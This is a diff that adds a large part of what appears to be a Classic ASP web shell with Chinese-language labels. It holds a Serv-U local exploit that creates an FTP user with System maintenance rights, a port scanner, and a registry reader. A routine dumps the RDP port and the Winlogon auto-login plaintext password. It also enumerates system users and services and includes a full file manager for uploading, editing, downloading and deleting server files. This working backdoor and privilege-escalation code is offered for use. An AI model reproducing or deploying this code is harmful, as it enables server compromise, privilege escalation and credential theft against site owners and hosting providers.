+		echo " <tr><td>FTP PATH:</td><td><input name='fpath' type='text' class='TextBox' id='fpath' value='c:\\'></td></tr>"
+		echo "<tr><td colspan=2 class=trHead>&nbsp;</td></tr>"
+		echo "<tr><td> Privilege</td><td><select para=value name='privilege'><option value=2>Read-only Admin</option><option value=3>Group Admin</option><option value=4>Domain Admin</option><option value=5>System Admin</option></select></td></tr>"
+	    echo "<tr><td align=right><input name='radiobutton' type='radio' value='add' checked class='TextBox'>Add User<input type='radio' name='radiobutton' value='del' class='TextBox'>Del User </p><p align='center'><input type=hidden value=ServU name=pageName></td><td><input name='Submit' type='submit' class='buttom' style='width:100px;border:none;' value='Run' /></td></tr></form>"
+
+select case privilege
+   case 2:
+  privilege="ReadOnly"
+   case 3:
+  privilege="Group"
+   case 4:
+  privilege="Domain"
+   case 5:
+  privilege="System"
+  end select
+	if request.Form("radiobutton") = "add" Then
+
+loginuser = "User " & user & vbCrLf
+loginpass = "Pass " & pass & vbCrLf
+mt = "SITE MAINTENANCE" & vbCrLf
+newdomain = "-SETDOMAIN" & vbCrLf & "-Domain=" & domain &"|0.0.0.0|" & fport & "|-1|1|0" & vbCrLf & "-DynDNSEnable=0" & vbCrLf & "  DynIPName=" & vbCrLf
+newuser = "-SETUSERSETUP" & vbCrLf & "-IP=0.0.0.0" & vbCrLf & "-PortNo=" & fport & vbCrLf & "-User="& fuser & vbCrLf & "-Password=" & fpass & vbCrLf & _
+        "-HomeDir=" & fpath & vbCrLf & "-LoginMesFile=" & vbCrLf & "-Disable=0" & vbCrLf & "-RelPaths=1" & vbCrLf & _
+        "-NeedSecure=0" & vbCrLf & "-HideHidden=0" & vbCrLf & "-AlwaysAllowLogin=0" & vbCrLf & "-ChangePassword=0" & vbCrLf & _
+        "-QuotaEnable=0" & vbCrLf & "-MaxUsersLoginPerIP=-1" & vbCrLf & "-SpeedLimitUp=0" & vbCrLf & "-SpeedLimitDown=0" & vbCrLf & _
+        "-MaxNrUsers=-1" & vbCrLf & "-IdleTimeOut=600" & vbCrLf & "-SessionTimeOut=-1" & vbCrLf & "-Expire=0" & vbCrLf & "-RatioUp=1" & vbCrLf & _
+        "-RatioDown=1" & vbCrLf & "-RatiosCredit=0" & vbCrLf & "-QuotaCurrent=0" & vbCrLf & "-QuotaMaximum=0" & vbCrLf & _
+        "-Maintenance=" & privilege  & vbCrLf & "-PasswordType=Regular" & vbCrLf & "-Ratios=None" & vbCrLf & " Access=" & fpath &"|RWAMELCDP" & vbCrLf
+quit = "QUIT" & vbCrLf		
+		'--------
+		'On Error Resume Next
+		Set xPost = CreateObject("Microsoft.XMLHTTP")
+		xPost.Open "POST", "http://127.0.0.1:"& port &"/secdst",True, "", ""
+		xPost.Send loginuser & loginpass & mt & newdomain & newuser & quit
+		Set xPost =nothing
+		echo "<tr><td colspan=2><div align="&chr(34 )&"center"&chr(34 )&">FTP user "&fuser&"  pass "&fpass&" at port "& fport &"</div></td></td><table>"
+	elseif request.Form("radiobutton") = "del" Then
+	
+		loginuser = "User " & user & vbCrLf
+		loginpass = "Pass " & pass & vbCrLf
+		mt = "SITE MAINTENANCE" & vbCrLf
+		deluser =  "-DELETEUSER" & vbcrlf & "-IP=0.0.0.0" & vbcrlf & "-PortNo=" & port & vbcrlf & " User="& fuser & vbcrlf
+		quit = "QUIT" & vbCrLf	
+		Set xPost3 = CreateObject("MSXML2.XMLHTTP")
+		xPost3.Open "POST", "http://127.0.0.1:"& port &"/secdst", True
+		xPost3.Send loginuser & loginpass & mt & deluser & quit 
+		Set xPOST3=nothing
+		echo "<tr><td colspan=2><div align="&chr(34 )&"center"&chr(34 )&">FTP user "&fuser&"  pass "&fpass&" at port "& fport &" have deleted</div></td></tr></table>"
+	else
+		echo  "<div align="&chr(34 )&"center"&chr(34 )&"><tr><td colspan=2>Exp Start!!!</div></td></td><table>"
+	end if
+End Sub
+	
+sub DuanKou()
+Server.ScriptTimeout = 7776000
+if request.Form("port")="" then
+PortList="21,23,25,80,110,135,139,445,1433,3389,43958"
+else
+PortList=request.Form("port")
+end if
+if request.Form("ip")="" then
+IP="127.0.0.1"
+else
+IP=request.Form("ip")
+end if
+echo"<TABLE width='970'  border=1><form name='form1' method='post' action='' onSubmit='form1.submit.disabled=true;'><TR><TD class=td colSpan=2><B><font face=webdings>8</font>端口扫描器</B></TD></TR><tr><td colspan=2 class=trHead>&nbsp;</td></tr><TR><TD >扫描 IP:</TD><TD D><input name='ip' type='text' class='TextBox' id='ip' value='"&IP&"' size='60'></TD></TR><TR><TD D>端口:</TD><TD D><input name='port' type='text' class='TextBox' size='60' value='"&PortList&"'><input name='submit' type='submit' value=' scan '><input type=hidden value=DuanKou name=pageName><input name='scan' type='hidden' id='scan' value='111'></TD></TR>"
+If request.Form("scan") <> "" Then
+	timer1 = timer
+	tmp = Split(request.Form("port"),",")
+	ip = Split(request.Form("ip"),",")
+	For hu = 0 to Ubound(ip)
+		If InStr(ip(hu),"-") = 0 Then
+			For i = 0 To Ubound(tmp)
+				If Isnumeric(tmp(i)) Then 
+					Call Scan(ip(hu), tmp(i))
+				Else
+					seekx = InStr(tmp(i), "-")
+					If seekx > 0 Then
+						startN = Left(tmp(i), seekx - 1 )
+						endN = Right(tmp(i), Len(tmp(i)) - seekx )
+						If Isnumeric(startN) and Isnumeric(endN) Then
+							For j = startN To endN
+								Call Scan(ip(hu), j)
+							Next
+						Else
+							echo(startN & " or " & endN & " is not number<br>")
+						End If
+					Else
+						echo(tmp(i) & " is not number<br>")
+					End If
+				End If
+			Next
+		Else
+			ipStart = Mid(ip(hu),1,InStrRev(ip(hu),"."))
+			For xxx = Mid(ip(hu),InStrRev(ip(hu),".")+1,1) to Mid(ip(hu),InStr(ip(hu),"-")+1,Len(ip(hu))-InStr(ip(hu),"-"))
+				For i = 0 To Ubound(tmp)
+					If Isnumeric(tmp(i)) Then 
+						Call Scan(ipStart & xxx, tmp(i))
+					Else
+						seekx = InStr(tmp(i), "-")
+						If seekx > 0 Then
+							startN = Left(tmp(i), seekx - 1 )
+							endN = Right(tmp(i), Len(tmp(i)) - seekx )
+							If Isnumeric(startN) and Isnumeric(endN) Then
+								For j = startN To endN
+									Call Scan(ipStart & xxx,j)
+								Next
+							Else
+								echo("<tr><td D colSpan=2 >"&startN & " or " & endN & " is not number</TD></TR>")
+							End If
+						Else
+							echo("<tr><td D colSpan=2 >"&tmp(i) & " is not number</TD></TR>")
+						End If
+					End If
+				Next
+			Next
+		End If
+	Next
+	timer2 = timer
+	thetime=cstr(int(timer2-timer1))
+	echo"<tr><td D  colSpan=2 align=center >费时 "&thetime&" 秒</TD></TR></TABLE>"
+END IF
+Err.Clear
+end sub
+
+Sub Scan(targetip, portNum)
+	On Error Resume Next
+	set conn = Server.CreateObject("ADODB.connection")
+	connstr="Provider=SQLOLEDB.1;Data Source=" & targetip &","& portNum &";User ID=lake2;Password=;"
+	conn.ConnectionTimeout = 1
+	conn.open connstr
+	If Err Then
+		If Err.number = -2147217843 or Err.number = -2147467259 Then
+			If InStr(Err.description, "(Connect()).") > 0 Then
+				echo("<tr><td D colSpan=2 >"&targetip & ":" & portNum & "............................关闭</TD></TR>")
+			Else
+				echo("<tr><td D colSpan=2 >"&targetip & ":" & portNum & "............................<font color=red>开放</font></TD></TR>")
+			End If
+		End If
+	End If
+End Sub
+Err.Clear '结束
+	
+	sub ZhuceBiao() '读取注册表数据
+echo "<TABLE width='970'  border='1' align='center'><TR><TD colspan=2 class=td><font face=webdings>8</font>注册表键值读取</TD></TR><tr><td colspan=2 class=trHead>&nbsp;</td></tr><tr><td  colspan=2><form method=post><input type=hidden value=ZhuceBiao name=PageName><input name=thePath value='HKLM\SYSTEM\CurrentControlSet\Control\ComputerName\ComputerName\ComputerName' size=80><input type=submit value=' 读取 '></TD></TR>"
+if Request("PageName")<>"" then
+On Error Resume Next
+Set wsX = Server.CreateObject("WScript.Shell")
+thePath=Request("thePath")
+theArray=wsX.RegRead(thePath)
+If IsArray(theArray) Then
+For i=0 To UBound(theArray)
+if theArray(i)="" and thePath<>"" then
+theArray(i)="无法打开注册键值 "& thePath &" 进行读取。"
+end if
+echo "<tr><td  colspan=2>●" & theArray(i) &"</TD></TR>"
+Next
+ Else
+if theArray="" and thePath<>"" then
+theArray="无法打开注册键值 "& thePath &" 进行读取。"
+end if
+echo "<tr><td colspan=2>●" & theArray &"</TD></TR></table>"
+End If
+end if
+end sub    '结束
+	
+    Sub Getzhongduan()
+On Error Resume Next
+	Set wsX = Server.CreateObject("WScript.Shell")
+	Dim terminalPortPath, terminalPortKey, termPort
+	Dim autoLoginPath, autoLoginUserKey, autoLoginPassKey
+	Dim isAutoLoginEnable, autoLoginEnableKey, autoLoginUsername, autoLoginPassword
+	terminalPortPath = "HKLM\SYSTEM\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp\"
+	terminalPortKey = "PortNumber"
+	termPort = wsX.RegRead(terminalPortPath & terminalPortKey)
+	echo"<TABLE width='970'  border='1' align='center'>"
+	echo"<tr><td height='20' colspan=4 class=td><font face=webdings>8</font> 终端服务端口及自动登录</td></tr>"
+    echo "<tr><td colspan=4 class=trHead>&nbsp;</td></tr>"
+	If termPort = "" Or Err.Number <> 0 Then
+    echo "<tr><td colspan=4 >无法得到终端服务端口, 请检查权限是否已经受到限制.<br/></td></tr>"
+	 Else
+    echo "<tr><td colspan=4 >当前终端服务端口: " & termPort & "<br/></td></tr>"
+	End If
+	autoLoginPath = "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon\"
+	autoLoginEnableKey = "AutoAdminLogon"
+	autoLoginUserKey = "DefaultUserName"
+	autoLoginPassKey = "DefaultPassword"
+	isAutoLoginEnable = wsX.RegRead(autoLoginPath & autoLoginEnableKey)
+	If isAutoLoginEnable = 0 Then
+	echo "<tr><td colspan=4 >系统自动登录功能未开启<br/></td></tr>"
+	Else
+		autoLoginUsername = wsX.RegRead(autoLoginPath & autoLoginUserKey)
+	echo "<tr><td colspan=4 >自动登录的系统帐户: " & autoLoginUsername & "<br></td></tr>"
+		autoLoginPassword = wsX.RegRead(autoLoginPath & autoLoginPassKey)
+		If Err Then
+			Err.Clear
+			echo "False"
+		End If
+   echo "<tr><td colspan=4 >自动登录的帐户密码: " & autoLoginPassword & "<br></td></tr>"
+   echo "</table>"
+	End If
+       End Sub
+	   
+	Function Course()
+  SI="<TABLE width='970'  border='1' align='center'>"
+  SI=SI&"<tr><td height='20' colspan=4 class=td><font face=webdings>8</font> 系统用户与服务</td></tr>"
+  SI=SI&"<tr>"
+  SI=SI& "<td colspan=4 class=trHead>&nbsp;</td>"
+  SI=SI&"</tr>"
+  on error resume next
+  for each obj in getObject("WinNT://.")
+  err.clear
+  if OBJ.StartType="" then
+  SI=SI&"<tr>"
+  SI=SI&"<td height=""20"" colspan=""2"">&nbsp;"
+  SI=SI&obj.Name
+  SI=SI&"</td><td colspan=""2"">&nbsp;" 
+  SI=SI&"系统用户(组)"
+  SI=SI&"</td></tr>"
+  SI0="<tr>" 
+  end if
+  if OBJ.StartType=2 then lx="自动"
+  if OBJ.StartType=3 then lx="手动"  
+  if OBJ.StartType=4 then lx="禁用"
+  if LCase(mid(obj.path,4,3))<>"win" and OBJ.StartType=2 then
+  SI1=SI1&"<tr><td height=""20"" colspan=2 >&nbsp;"&obj.Name&"</td><td height=""20"" colspan=""2"">&nbsp;"&obj.DisplayName&"<tr><td height=""20""  colspan=""4"">[启动类型:"&lx&"]<font color=#FF0000>&nbsp;"&obj.path&"</font></td></tr>"
+  else
+  SI2=SI2&"<tr><td height=20  colspan=2>&nbsp;"&obj.Name&"</td><td height=""20"" colspan=""2"" >&nbsp;"&obj.DisplayName&"<tr><td height=""20""  colspan=""4"">[启动类型:"&lx&"]<font color=#008000>&nbsp;"&obj.path&"</font></td></tr>"
+  end if
+  next
+  response.write  SI&SI0&SI1&SI2&"</table>"
+End Function
+
+	Sub PageSearch()
+		Dim strKey, strPath
+		strKey = GetPost("Key")
+		Server.ScriptTimeout = 5000
+		If thePath = "" Then thePath = rootPath
+		
+		ShowTitle("文本文件搜索器")
+		
+		SearchTable(strKey)
+		
+		If theAct <> "" And strKey <> "" Then
+			SearchIt(strKey)
+		End If
+	End Sub
+	
+	Sub SearchTable(strKey)
+		echo "<table width=970 border=1>"
+		echo "<form method=post action='" & url & "'>"
+		echo "<input type=hidden value=PageSearch name=PageName>"
+		echo "<tr>"
+		echo "<td colspan=2 class=td><font face=webdings>8</font> 文本文件搜索器(需FSO支持)</td>"
+		echo "</tr>"
+		echo "<tr>"
+		echo "<td colspan=2 class=trHead>&nbsp;</td>"
+		echo "</tr>"
+		echo "<tr>"
+		echo "<td>&nbsp;路径</td>"
+		echo "<td>&nbsp;<input name=thePath type=text id=thePath value='"
+		echo HtmlEncode(thePath)
+		echo "' style='width:360px;'>"
+		echo "</td>"
+		echo "</tr>"
+		echo "<tr>"
+		echo "<td width='20%'>&nbsp;关键字</td>"
+		echo "<td>&nbsp;<input name=Key type=text value='" & HtmlEncode(strKey) & "' id=Key style='width:400px;'> "
+		echo "<select name=theAct id=theAct>"
+		echo "<option value=FileName selected>仅文件名</option>"
+		echo "<option value=FileContent>仅文本内容</option>"
+		echo "<option value=Both>两者都</option>"
+		echo "</select>"
+		echo " <input type=submit name=Submit value=提交> </td>"
+		echo "</tr>"
+		echo "<tr>"
+		echo "<td colspan=2 class=trHead>&nbsp;</td>"
+		echo "</tr>"
+		echo "<tr align=right>"
+		echo "<td colspan=2 class=td>"&VerName&"&nbsp;</td>"
+		echo "</tr>"
+		echo "</form>"
+		echo "</table>"
+	End Sub
+	
+	Sub SearchIt(key)
+		Dim strPath, theFolder
+		Response.Buffer = True
+		strPath = thePath
+		If fso.FolderExists(strPath) = False Then
+			ShowErr(thePath & " 目录不存在或者不允许访问!")
+		End If
+		Set theFolder = fso.GetFolder(strPath)
+		
+		echo "<br/><div style='width:970;border:1px solid #d8d8f0;'>"
+
+		Select Case theAct
+			Case "Both"
+				Call SearchFolder(theFolder, key, 1)
+			Case "FileName"
+				Call SearchFolder(theFolder, key, 2)
+			Case "FileContent"
+				Call SearchFolder(theFolder, key, 3)
+		End Select
+		
+		echo "</div>"
+		
+		Set theFolder = Nothing
+	End Sub
+	
+	Sub SearchFolder(folder, key, flag)
+		Dim ext, title, theFile, theFolder
+		
+		For Each theFile In folder.Files
+			ext = LCase(fso.GetExtensionName(theFile.Path))
+			If flag = 1 Or flag = 2 Then
+				If InStr(LCase(theFile.Name), LCase(key)) > 0 Then echo FileLink(theFile, "")
+			End If
+			If flag = 1 Or flag = 3 Then
+				If Instr(EditableFileExt, "$" & ext & "$") > 0 Then
+					If SearchFile(theFile, key, title) Then echo FileLink(theFile, title)
+				End If
+			End If
+		Next
+
+		Response.Flush()
+
+		For Each theFolder In folder.SubFolders
+			Call SearchFolder(theFolder, key, flag)
+		Next
+	end sub
+	
+	Function SearchFile(f, s, title)
+		Dim theFile, content, pos1, pos2
+		If isDebugMode = False Then On Error Resume Next
+
+		Set theFile = fso.OpenTextFile(f.Path)
+		content = theFile.ReadAll()
+		theFile.Close
+		Set theFile = Nothing
+
+		If Err Then
+			Err.Clear
+		End If
+
+		SearchFile = InStr(1, content, s, 1) 
+		If SearchFile > 0 Then
+			pos1 = InStr(1, content, "<TITLE>", 1)
+			pos2 = InStr(1, content, "</TITLE>", 1)
+			title = ""
+			If pos1 > 0 And pos2 > 0 Then
+				title = Mid(content, pos1 + 7, pos2 - pos1 - 7)
+			End If
+		End If
+	End Function
+	
+	Function FileLink(file, title)
+		fileLink = file.Path
+		If title = "" Then
+			title = file.Name
+		End If
+		fileLink = "&nbsp;<font color=ff0000>" & title & "</font> " & fileLink & "<br/>"
+	End Function
+
+	Sub PageCheck()
+		ShowTitle("服务器信息探针")
+		InfoCheck()
+		If theAct <> "" Then
+		GetAppOrSession(theAct)
+		End If
+		ObjCheck()
+	End Sub
+
+	Sub InfoCheck()
+		Dim aryCheck(7)
+		If isDebugMode = False Then On Error Resume Next
+		aryCheck(0) = Server.ScriptTimeOut() & "(秒)"
+		aryCheck(1) = FormatDateTime(Now(), 0)
+		aryCheck(2) = Request.ServerVariables("SERVER_NAME")
+		aryCheck(2) = aryCheck(2) & ", " & Request.ServerVariables("LOCAL_ADDR")
+		aryCheck(2) = aryCheck(2) & ":" & Request.ServerVariables("SERVER_PORT")
+		aryCheck(3) = Request.ServerVariables("OS")
+		aryCheck(3) = IIf(aryCheck(3) = "", "Windows2003", aryCheck(3)) & ", " & Request.ServerVariables("SERVER_SOFTWARE")
+		aryCheck(3) = aryCheck(3) & ", " & ScriptEngine & "/" & ScriptEngineMajorVersion & "." & ScriptEngineMinorVersion & "." & ScriptEngineBuildVersion
+		aryCheck(4) = rootPath & ", " & GetTheSize(fso.GetFolder(rootPath).Size)
+		aryCheck(5) = "Path: " & Request.ServerVariables("PATH_TRANSLATED") & "<br />"
+		aryCheck(5) = aryCheck(5) & "&nbsp;Url : http://" & Request.ServerVariables("SERVER_NAME") & Request.ServerVariables("Url")
+		aryCheck(6) = "变量数: " & Application.Contents.Count() & "(<a href=javascript:locate('app');>Application</a>),"
+		aryCheck(6) = aryCheck(6) & " 会话数: " & Session.Contents.Count & "(<a href=javascript:locate('session');>Session</a>),"
+		aryCheck(6) = aryCheck(6) & " 当前会话ID: " & Session.SessionId()
+
+		echo "<table width=970 border=1>"
+		echo "<tr>"
+		echo "<td colspan=2 class=td><font face=webdings>8</font> 服务器基本信息"
+		echo "</td>"
+		echo "</tr>"
+		echo "<tr>"
+		echo "<td colspan=2 class=trHead>&nbsp;</td>"
+		echo "</tr>"
+		echo "<tr class=td>"
+		echo "<td width='20%'>&nbsp;项目</td>"
+		echo "<td>&nbsp;值</td>"
+		echo "</tr>"
+		echo "<tr>"
+		echo "<td>&nbsp;默认超时</td>"
+		echo "<td>&nbsp;"&aryCheck(0)&"</td>"
+		echo "</tr>"
+		echo "<tr>"
+		echo "<td>&nbsp;当前时间</td>"
+		echo "<td>&nbsp;"&aryCheck(1)&"</td>"
+		echo "</tr>"
+		echo "<tr>"
+		echo "<td>&nbsp;服务器名</td>"
+		echo "<td>&nbsp;"&aryCheck(2)&"</td>"
+		echo "</tr>"
+		echo "<tr>"
+		echo "<td>&nbsp;软件环境</td>"
+		echo "<td>&nbsp;"&aryCheck(3)&"</td>"
+		echo "</tr>"
+		echo "<tr>"
+		echo "<td>&nbsp;站点目录</td>"
+		echo "<td>&nbsp;"&aryCheck(4)&"</td>"
+		echo "</tr>"
+		echo "<tr>"
+		echo "<td>&nbsp;当前路径</td>"
+		echo "<td>&nbsp;"&aryCheck(5)&"</td>"
+		echo "</tr>"
+		echo "<tr>"
+		echo "<td>&nbsp;其它</td>"
+		echo "<td>&nbsp;"&aryCheck(6)&"</td>"
+		echo "</tr>"
+		echo "<tr>"
+		echo "<td colspan=2 class=trHead>&nbsp;</td>"
+		echo "</tr>"
+		echo "<tr align=right>"
+		echo "<td colspan=2 class=td>"&VerName&"&nbsp;</td>"
+		echo "</tr>"
+		echo "</table>"
+	End Sub
+
+	Sub ObjCheck()
+		Dim aryObj(19)
+		Dim x, objTmp, theObj, strObj
+		If isDebugMode = False Then On Error Resume Next
+
+		strObj = Trim(getPost("TheObj"))
+		aryObj(0) = "MSWC.AdRotator|广告轮换组件"
+		aryObj(1) = "MSWC.BrowserType|浏览器信息组件"
+		aryObj(2) = "MSWC.NextLink|内容链接库组件"
+		aryObj(3) = "MSWC.Tools|"
+		aryObj(4) = "MSWC.Status|"
+		aryObj(5) = "MSWC.Counters|计数器组件"
+		aryObj(6) = "MSWC.PermissionChecker|权限检测组件"
+		aryObj(7) = "Adodb.Connection|ADO 数据对象组件"
+		aryObj(8) = "CDONTS.NewMail|虚拟 SMTP 发信组件"
+		aryObj(9) = "Scripting.FileSystemObject|FSO组件"
+		aryObj(10) = "Adodb.Stream|Stream 流组件"
+		aryObj(11) = "Shell.Application|"
+		aryObj(12) = "WScript.Shell|"
+		aryObj(13) = "Wscript.Network|"
+		aryObj(14) = "ADOX.Catalog|"
+		aryObj(15) = "JMail.SmtpMail|JMail 邮件收发组件"
+		aryObj(16) = "Persits.Upload.1|ASPUpload 文件上传组件"
+		aryObj(17) = "LyfUpload.UploadFile|刘云峰的文件上传组件组件"
+		aryObj(18) = "SoftArtisans.FileUp|SA-FileUp 文件上传组件"
+		aryObj(19) = strObj & "|您所要检测的组件"
+
+		echo "<br/>"
+		echo "<table width=970 border=1>"
+		echo "<tr>"
+		echo "<td colspan=3 class=td><font face=webdings>8</font> 服务器组件信息"
+		echo "</td>"
+		echo "</tr>"
+		echo "<tr>"
+		echo "<td colspan=3 class=trHead>&nbsp;</td>"
+		echo "</tr>"
+		echo "<tr class=td>"
+		echo "<td>&nbsp;组件<font color=#666666>(描述)</font></td>"
+		echo "<td width=10% align=center>支持</td>"
+		echo "<td width=15% align=center>版本</td>"
+		echo "</tr>"
+		For Each x In aryObj
+			theObj = Split(x, "|")
+			If theObj(0) = "" Then Exit For
+			Set objTmp = Server.CreateObject(theObj(0))
+			If Err <> -2147221005 Then
+				x = x & "|√|"
+				x = x & objTmp.Version
+			Else
+				x = x & "|<font color=red>×</font>|"
+			End If
+			If Err Then Err.Clear
+			Set objTmp = Nothing
+
+			theObj = Split(x, "|")
+			theObj(1) = theObj(0) & IIf(theObj(1) <> "", " <font color=#666666>(" & theObj(1) & ")</font>", "")
+			echo "<tr>"
+			echo "<td>&nbsp;" & theObj(1) & "</td>"
+			echo "<td align=center>" & theObj(2) & "</td>"
+			echo "<td align=center>" & theObj(3) & "</td>"
+			echo "</tr>"
+		Next
+		echo "<form method=post action='" & url & "'>"
+		echo "<input type=hidden name=PageName value=PageCheck><input type=hidden name=theAct id=theAct>"
+		echo "<tr>"
+		echo "<td colspan=3>&nbsp;其它组件检测:"
+		echo "<input name=TheObj type=text id=TheObj style='width:585px;' value=""" & strObj & """>"
+		echo "<input type=submit name=Submit value=提交></td>"
+		echo "</tr>"
+		echo "</form>"
+		echo "<tr>"
+		echo "<td colspan=3 class=trHead>&nbsp;</td>"
+		echo "</tr>"
+		echo "<tr align=right>"
+		echo "<td colspan=3 class=td>"&VerName&"&nbsp;</td>"
+		echo "</tr>"
+		echo "</table>"
+	End Sub
+
+	Sub GetAppOrSession(theAct)
+		Dim x, y
+		If isDebugMode = False Then On Error Resume Next
+
+		echo "<br/>"
+		echo "<table width=970 border=1 class=fixTable>"
+		echo "<tr>"
+		echo "<td colspan=2 class=td><font face=webdings>8</font> Application/Session 查看"
+		echo "</td>"
+		echo "</tr>"
+		echo "<tr>"
+		echo "<td colspan=2 class=trHead>&nbsp;</td>"
+		echo "</tr>"
+		echo "<tr class=td>"
+		echo "<td width='20%'>&nbsp;变量</td>"
+		echo "<td>&nbsp;值</td>"
+		echo "</tr>"
+		If theAct = "app" Then
+			For Each x In Application.Contents
+				echo "<tr><td valign=top>"
+				echo "&nbsp;<span class=fixSpan style='width:130px;' title='" & x & "'>" & x & "<span>"
+				echo "</td><td style='padding-left:7px;'><span>"
+				If IsArray(Application(x)) = True Then
+					For Each y In Application(x)
+						echo "<div>" & Replace(HtmlEncode(y), vbNewLine, "<br/>") & "</div>"
+					Next
+				 Else
+					echo Replace(HtmlEncode(Application(x)), vbNewLine, "<br/>")
+				End If
+				echo "</span></td></tr>"
+			Next
+		End If
+		If theAct = "session" Then
+			For Each x In Session.Contents
+				echo "<tr><td valign=top>"
+				echo "&nbsp;<span class=fixSpan style='width:130px;' title='" & x & "'>" & x & "<span>"
+				echo "</td><td style='padding-left:7px;'><span>"
+				echo Replace(HtmlEncode(Session(x)), vbNewLine, "<br/>")
+				echo "</span></td></tr>"
+			Next
+		End If
+		echo "<tr>"
+		echo "<td colspan=2 class=trHead>&nbsp;</td>"
+		echo "</tr>"
+		echo "<tr align=right>"
+		echo "<td colspan=2 class=td>"&VerName&"&nbsp;</td>"
+		echo "</tr>"
+		echo "</table>"
+	End Sub
+
+	Sub PageFso()
+		ShowTitle("FSO文件浏览操作器")
+		
+		Select Case theAct
+			Case "rename"
+				RenOne()
+			Case "download"
+				DownTheFile()
+				Response.End()
+			Case "del"
+				DelOne()
+			Case "newone"
+				NewOne()
+			Case "saveas"
+				SaveAs()
+			Case "save"
+				SaveToFile()
+				AlertThenClose("文件修改成功!")
+				ShowEdit()
+				Response.End()
+			Case "showedit"
+				ShowEdit()
+				Response.End()
+			Case "showimage"
+				ShowImage()
+				Response.End()
+			Case "copy", "move"
+				MoveCopyOne()
+		End Select
+		
+		If theAct <> "" Then thePath = GetPost("truePath")
+		
+		FsoFileExplorer()
+	End Sub
+
+	Sub FsoFileExplorer()
+		Dim objX, theFolder, folderId, extName, parentFolderName
+		Dim strPath
+		If isDebugMode = False Then On Error Resume Next
+		If thePath = "" Then thePath = rootPath
+		strPath = thePath
+		
+		If fso.FolderExists(strPath) = False Then
+			ShowErr(thePath & " 目录不存在或者不允许访问!")
+		End If
+		
+		Set theFolder = fso.GetFolder(strPath)
+		parentFolderName = fso.GetParentFolderName(strPath) & "\"
+		
+		echo "<table width=970 border=1>"
+		echo "<form method=post action='" & url & "'>"
+		echo "<tr>"
+		echo "<td colspan=2 class=td><font face=webdings>8</font> FSO文件浏览操作器"
+		echo "</tr>"
+		echo "<tr><td colspan=2 class=trHead>&nbsp;</td></tr>"
+		echo "<tr>"
+		echo "<td colspan=2>&nbsp;"
+		echo "路径: <input style='width:500px;' name=thePath value=""" & HtmlEncode(thePath) & """>"
+		echo "<input type=hidden name=truePath value=""" & HtmlEncode(thePath) & """>"
+		echo " <input type=button value='提交' onclick=Command('submit');>"
+		echo " <input type=button value=上传 onclick=Command('upload')>"
+		echo "</td>"
+		echo "</tr>"
+		echo "<tr><td colspan=2 class=trHead>&nbsp;</td></tr>"
+		echo "<tr><td valign=top>"
+		echo "<input type=hidden name=theAct>"
+		echo "<input type=hidden name=param>"
+		echo "<input type=hidden value=PageFso name=PageName>"
+		echo "<table width='99%' align=center>"
+		echo "<tr><td colspan=4 class=trHead>&nbsp;</td></tr><tr class=td><td>"
+
+		If parentFolderName <> "\" Then
+			folderId = Replace(parentFolderName, "\", "\\")
+			echo "&nbsp;<a href=""javascript:changeThePath(&#34;" & folderId & "&#34;);"">↑回上级目录</a>"
+		End If
+		echo "</td><td align=center width=80>大小</td>"
+		echo "<td align=center width=140>最后修改</td><td align=center>操作</td></tr>"
+
+		For Each objX In theFolder.SubFolders
+			folderId = Replace(objX.Path, "\", "\\")
+			echo "<tr title=""" & objX.Name & """><td>&nbsp;<font color=CCCCFF>■</font>"
+			echo "<span class=fixSpan style='width:180;'>"
+			echo "<a href=""javascript:changeThePath(&#34;" & folderId & "&#34;);"">"& objX.Name & "</a></span>"
+			echo "</td>"
+			echo "<td align=center>-</td>"
+			echo "<td align=center>" & objX.DateLastModified & "</td><td>"
+			echo "<input type=checkbox name=checkBox value=""" & objX.Name & """>"
+			echo "<input type=button onclick=""Command('rename',&#34;" & objX.Name & "&#34;);"" value='Ren' title=重命名>"
+			echo "<input type=button value='SaveAs' title=另存为 onclick=""Command('saveas',&#34;" & Replace(objX.Path, "\", "\\") & "&#34;)"">"
+			echo "</td></tr>"
+		Next
+		For Each objX In theFolder.Files
+			If Left(objX.Path, Len(rootPath)) <> rootPath Then
+				folderId = ""
+			 Else
+				folderId = Replace(Replace(UrlEncode(Mid(objX.Path, Len(rootPath) + 1)), "%2E", "."), "+", "%20")
+			End If
+			echo "<tr title=""" & objX.Name & """><td>&nbsp;<font color=CCCCFF>□</font>"
+			echo "<span class=fixSpan style='width:180;'>"
+			If folderId = "" Then
+				echo objX.Name
+			 Else
+				echo "<a href='" & Replace(folderId, "%5C", "/") & "' target=_blank>" & objX.Name & "</a>"
+			End If
+			echo "</span></td><td align=center>" & GetTheSize(objX.Size) & "</td>"
+			echo "<td align=center>" & objX.DateLastModified & "</td><td>"
+			echo "<input type=checkbox name=checkBox value=""" & objX.Name & """>"
+			
+			extName = LCase(fso.GetExtensionName(objX.Path))
+			If InStr(editableFileExt, "$" & extName & "$") > 0 Then
+				echo "<input type=button value='Edit' title=编辑 onclick=""Command('showedit',&#34;" & objX.Name & "&#34;);"">"
+			End If
+			If InStr(imageFileExt, "$" & extName & "$") > 0 Then
+				echo "<input type=button value='View' title=查看图片 onclick=""Command('showimage',&#34;" & objX.Name & "&#34;);"">"
+			End If
+			If extName = "mdb" Then
+				echo "<input type=button value='Access' title=数据库操作 onclick=Command('access',""" & objX.Name & """)>"
+			End If
+			echo "<input type=button value='Down' title=下载 onclick=""Command('download',&#34;" & objX.Name & "&#34;)"">"
+			echo "<input type=button value='Ren' title=重命名 onclick=""Command('rename',&#34;" & objX.Name & "&#34;)"">"
+			echo "<input type=button value='SaveAs' title=另存为 onclick=""Command('saveas',&#34;" & Replace(objX.Path, "\", "\\") & "&#34;)"">"
+			echo "</td></tr>"
+		Next
+		echo "<tr class=td><td colspan=3></td>"
+		echo "<td><input type=checkbox name=checkAll onclick=checkAllBox(this);>"
+		echo "<input type=button value='Delete' onclick=Command('del')>"
+		echo "<input type=button value='Pack' title=打包选中文件(夹) onclick=Command('pack')>"
+		echo "</td></tr></table>"
+		echo "</td><td width='20%' valign=top align=center>"
+		echo "<input type=button value=刷新 onclick=this.form.thePath.value=this.form.truePath.value;Command('submit');><br/>"
+		echo "<input type=button value=新建文件 onclick=Command('newone','file')><br/>"
+		echo "<input type=button value=新建文件夹 onclick=Command('newone','folder')><hr style='color:#d8d8f0;'/>"
